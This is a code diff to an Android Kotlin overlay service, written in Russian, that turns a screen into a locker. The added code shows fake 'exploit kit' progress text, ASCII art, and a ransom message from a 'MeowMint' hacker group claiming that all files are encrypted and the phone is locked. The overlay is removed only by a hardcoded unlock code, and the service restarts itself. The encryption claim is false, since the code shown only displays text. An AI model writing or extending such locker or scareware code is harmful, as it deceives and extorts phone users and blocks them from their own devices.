@@ -15,13 +15,16 @@ import android.view.View
 import android.view.WindowManager
 import android.widget.Button
 import android.widget.EditText
+import android.widget.ImageView
 import android.widget.LinearLayout
 import android.widget.TextView
+import java.io.File
 
 class LockOverlayService : Service() {
     private lateinit var windowManager: WindowManager
     private lateinit var overlayView: LinearLayout
     private lateinit var mainText: TextView
+    private lateinit var ransomLayout: LinearLayout
     private lateinit var inputLayout: LinearLayout
     
     private val PASSWORD = "12908449519408372641"
@@ -41,49 +44,95 @@ class LockOverlayService : Service() {
         overlayView = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setBackgroundColor(Color.parseColor("#800000")) // Темно-красный
+            setBackgroundColor(Color.BLACK)
         }
         
         mainText = TextView(this).apply {
-            setTextColor(Color.WHITE)
-            textSize = 16f
+            setTextColor(Color.parseColor("#00FF00"))
+            textSize = 12f
             typeface = Typeface.MONOSPACE
             gravity = Gravity.CENTER
             text = """
-                _..---====---.._
-                      _.-''     .----.     ''-._
-                    .'         /      \         '.
-                   <          |   ()   |          >
-                    '.         \      /         .'
-                      '-._      '----'      _.-'
-                          ''--...____...--''
-                             ВАС ЗАМЕТИЛИ
+                > exploit kit v6.6.6 ...
+                > bypass firewall ... [OK]
+                > inject payload ... [OK]
+                > root access ... [GRANTED]
+                > encrypt /sdcard ... 100%
             """.trimIndent()
         }
         overlayView.addView(mainText)
         
+        ransomLayout = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            gravity = Gravity.CENTER_VERTICAL
+            visibility = View.GONE
+            setPadding(20, 20, 20, 20)
+            setBackgroundColor(Color.BLACK)
+        }
+
+        val logoView = ImageView(this).apply {
+            // Ищем картинку в ресурсах. Если ее нет (потому что она в корне), ставим заглушку
+            val resId = resources.getIdentifier("meow_logo", "drawable", packageName)
+            if (resId != 0) {
+                setImageResource(resId)
+            } else {
+                // Если ее нет в drawable, ставим стандартную иконку, чтобы не крашилось
+                setImageResource(android.R.drawable.ic_dialog_alert) 
+            }
+            val layoutParams = LinearLayout.LayoutParams(350, 350)
+            layoutParams.setMargins(0, 0, 30, 0)
+            this.layoutParams = layoutParams
+            scaleType = ImageView.ScaleType.FIT_CENTER
+        }
+
+        val infoView = TextView(this).apply {
+            text = """
+                Привет юзер!
+                
+                Ты попался на MeowMint!
+                Все ваши файлы были зашифрованы,
+                а телефон заблокирован хакерской
+                группировкой MEOW!
+                
+                xdwd
+                
+                Creator: @ME0W_MINT
+                Coder: @ME0W_MINT
+                Beta Tester / Helper: @ME0W_MINT
+                ------------------------
+                Squad: @ME0W_MINT
+            """.trimIndent()
+            setTextColor(Color.parseColor("#FF00FF"))
+            textSize = 11f
+            typeface = Typeface.MONOSPACE
+        }
+        
+        ransomLayout.addView(logoView)
+        ransomLayout.addView(infoView)
+        overlayView.addView(ransomLayout)
+
         inputLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
             visibility = View.GONE
-            setPadding(20, 20, 20, 20)
+            setPadding(40, 40, 40, 40)
             setBackgroundColor(Color.parseColor("#0000AA"))
         }
         
         val hintText = TextView(this).apply {
-            text = "УВЫ! Вы подверглись масштабной хакерской атаке.\nВведите код разблокировки:"
+            text = "Введите код разблокировки:"
             setTextColor(Color.WHITE)
-            textSize = 16f
+            textSize = 18f
             gravity = Gravity.CENTER
         }
         
         val input = EditText(this).apply {
-            hint = "Введите код"
+            hint = "Код"
             inputType = InputType.TYPE_CLASS_NUMBER
         }
         
         val btnUnlock = Button(this).apply {
-            text = "РАЗБЛОКИРОВАТЬ"
+            text = "ПОДТВЕРДИТЬ"
             setOnClickListener {
                 if (input.text.toString() == PASSWORD) {
                     stopSelf()
@@ -107,38 +156,77 @@ class LockOverlayService : Service() {
         val handler = Handler(Looper.getMainLooper())
         
         handler.postDelayed({
-            overlayView.setBackgroundColor(Color.parseColor("#B30000"))
+            overlayView.setBackgroundColor(Color.BLACK)
+            mainText.setTextColor(Color.WHITE)
+            mainText.textSize = 16f
             mainText.text = """
-                 ...             
-               ;::::;            
-             ;::::; :;           
-           ;:::::'   :;          
-          ;:::::;     ;.         
-         ,:::::'       ;           OOO\
-         ::::::;       ;          OOOOO\
-         ;:::::;       ;         OOOOOOOO
-        ,;::::::;     ;'         / OOOOOOO
-      ;:::::::::`. ,,,;.        /  / DOOOOOO
-    .';:::::::::::::::::;,     /  /     DOOOO
-   ,::::::;::::::;;;;::::;,   /  /        DOOO
-  ;`::::::`'::::::;;;::::: ,#/  /          DOOO
-  :`:::::::`;::::::;;::: ;::#  /            DOOO
-  ::`:::::::`;:::::::: ;::::# /              DOO
-  `:`:::::::`;:::::: ;::::::#/               DOO
-   :::`:::::::`;; ;:::::::::##                OO
-   ::::`:::::::`;::::::::;:::#                OO
-   `:::::`::::::::::::;'`:;::#                O
-    `:::::`::::::::;' /  / `:#
-     ::::::`:::::;'  /  /   `#
+                _..---====---.._
+                      _.-''     .----.     ''-._
+                    .'         /      \         '.
+                   <          |   ()   |          >
+                    '.         \      /         .'
+                      '-._      '----'      _.-'
+                          ''--...____...--''
+                             ВАС ЗАМЕТИЛИ
             """.trimIndent()
-            mainText.textSize = 9f // Уменьшили, чтобы смерть влезла в экран
             
             handler.postDelayed({
-                overlayView.visibility = View.GONE
-                inputLayout.visibility = View.VISIBLE
-            }, 5000)
+                overlayView.gravity = Gravity.TOP or Gravity.START 
+                mainText.gravity = Gravity.TOP or Gravity.START
+                mainText.setTextColor(Color.parseColor("#FF00FF"))
+                mainText.textSize = 5f
+                
+                mainText.text = """
+           @   @@                                
+         @@ @@ @@@                               
+         @    @@  @@@       @@ @@                
+        @@@@@@@@@     @@@@@@@@   @@              
+        @@@@                    @                
+        @@ @@                  @@                
+        @@    @@@    @@@@@     @@@               
+             @@@@@  @@@  @     @@                
+            @  @@@  @@@  @    @@                 
+        @@  @  @@@  @@@       @@                 
+        @@@@@@@@ @@@@@@  @@@  @    @@@@          
+          @@ @@@@  @@@@@@@@   @@  @@@  @@        
+             @@@@@@@@@@@@@@   @@@@@@     @@      
+             @@   @@@@  @@     @ @@      @@      
+              @@   @@@ @@     @@@@@       @@     
+              @@       @@    @@ @@        @@     
+               @@@ @@  @@@  @@             @@@   
+               @  @@   @@@@@               @@@@  
+              @@  @@  @@ @@               @@@@@  
+            @@@@@ @@   @  @@@             @@@@   
+         @@@@  @@ @   @@    @            @@      
+         @@    @@ @   @@    @           @@       
+        @@@    @@@@   @@   @@                    
+        @@ @@@   @@@   @@    @        @@@@       
+     @@   @@@@@@@@@@@@@@@@@@@@    @@@@@          
+   @@@  @@  @@@@    @@@@@  @@@                   
+  @@   @  @ @@      @@      @                    
+ @@@@@@ @@@@@       @@      @                    
+ @@ @@@@@@@         @@@    @@                    
+  @@@@@             @    @@@                     
+                   @@ @@ @@                      
+                   @@@  @@@                      
+                    @@@@@@                       
+                """.trimIndent()
+                
+                handler.postDelayed({
+                    mainText.visibility = View.GONE
+                    overlayView.gravity = Gravity.CENTER
+                    ransomLayout.visibility = View.VISIBLE
+                    
+                    handler.postDelayed({
+                        overlayView.visibility = View.GONE
+                        inputLayout.visibility = View.VISIBLE
+                    }, 7000)
+                    
+                }, 4000)
+                
+            }, 3000)
             
-        }, 5000)
+        }, 3000)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
